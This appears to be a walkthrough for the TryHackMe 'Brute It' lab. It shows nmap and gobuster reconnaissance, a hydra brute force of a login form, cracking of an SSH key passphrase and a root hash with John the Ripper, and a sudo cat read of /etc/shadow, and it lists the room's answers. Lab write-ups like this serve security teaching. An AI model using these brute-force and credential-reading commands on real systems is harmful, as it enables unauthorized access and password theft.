# [Brute It](https://tryhackme.com/room/bruteit)

## Learn how to brute, hash cracking and escalate privileges in this box!

# Reconnaissance

## Before attacking, let's get information about the target

### Search for open ports using nmap. How many ports are open?

_nmap -sS -sV MACHINE_IP_

1. Perform a SYN scan with service version detection to identify open ports and running services on the target machine.

```bash
nmap -sS -sV <TARGET_IP>
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Answer:** Two ports are open (22/tcp and 80/tcp)

---

### What version of SSH is running?

**Answer:** OpenSSH 7.6p1

---

### What version of Apache is running?

**Answer:** 2.4.29

---

### Which Linux distribution is running?

**Answer:** Ubuntu

---

### Search for hidden directories on web server. What is the hidden directory?

_gobuster dir -u MACHINE_IP -w common.txt_

1. Use Gobuster to enumerate hidden directories on the web server using the common.txt wordlist from dirb.

```bash
gobuster dir -u <TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

**Results:**

```
/.hta                 (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/admin                (Status: 301) [Size: 312] [--> http://<TARGET_IP>/admin/]
/index.html           (Status: 200) [Size: 10918]
/server-status        (Status: 403) [Size: 277]
```

**Answer:** /admin

---

# Getting a shell

## Find a form to get a shell on SSH.

### What is the user:password of the admin panel?

_Use hydra to brute it_

1. Navigate to `http://<TARGET_IP>/admin/` and inspect the page source. In the HTML comments, we find a hint: `Hey john, if you do not remember, the username is admin`. This reveals that the username is **admin**.

2. Now we need to brute force the password using Hydra with the rockyou.txt wordlist. The login form uses POST method, so we'll use `http-post-form` module.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form "/admin/:user=^USER^&pass=^PASS^:Username or password invalid" -f
```

**Answer:** admin:xavier

---

### Crack the RSA key you found. What is John's RSA Private Key passphrase?

_Use john the ripper to crack the RSA Private Key file._

1. After successfully logging into the admin panel at `http://<TARGET_IP>/admin/panel/`, we find an RSA private key file named `id_rsa`. Download this file to your local machine.

2. Save the RSA private key as `key` and use `ssh2john` to convert it to a format that John the Ripper can crack.

```bash
ssh2john key > hash
john -w=/usr/share/wordlists/rockyou.txt hash
```

**Answer:** rockinroll

---

### user.txt

1. Now that we have John's RSA private key and passphrase, we can SSH into the target machine as user john.

```bash
chmod 600 key
ssh -i key john@<TARGET_IP>
# Password rockinroll
```

2. Once logged in, read the user flag:

```bash
cat user.txt
```

[SCREEN01]

---

### Web flag

1. The web flag can be found on the admin panel page after successful authentication. Navigate to `http://<TARGET_IP>/admin/panel/` in your browser while logged in as admin.

[SCREEN02]

---

# Privilege Escalation

## Now, we need to escalate our privileges.

### Find a form to escalate your privileges. What is the root's password?

_Search for gtfobins_

1. Check what commands the current user can run with sudo privileges:

```bash
sudo -l
```

**Results:**

```
User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
```

This shows that john can run `/bin/cat` as root without a password. We can exploit this to read sensitive files.

2. According to [GTFOBins](https://gtfobins.org/gtfobins/cat/#sudo), we can abuse `cat` to read any file on the system. Let's read the `/etc/shadow` file which contains password hashes:

```bash
sudo /bin/cat /etc/shadow
```

3. Extract the root user's hash from the output.

[SCREEN03]

4. Now crack the root password hash using John the Ripper:

```bash
john -w=/usr/share/wordlists/rockyou.txt hash
```

**Answer:** football

---

### root.txt

1. Now that we have the root password, we can switch to the root user and read the final flag:

```bash
su
# Password: football
cat /root/root.txt
```

[SCREEN04]
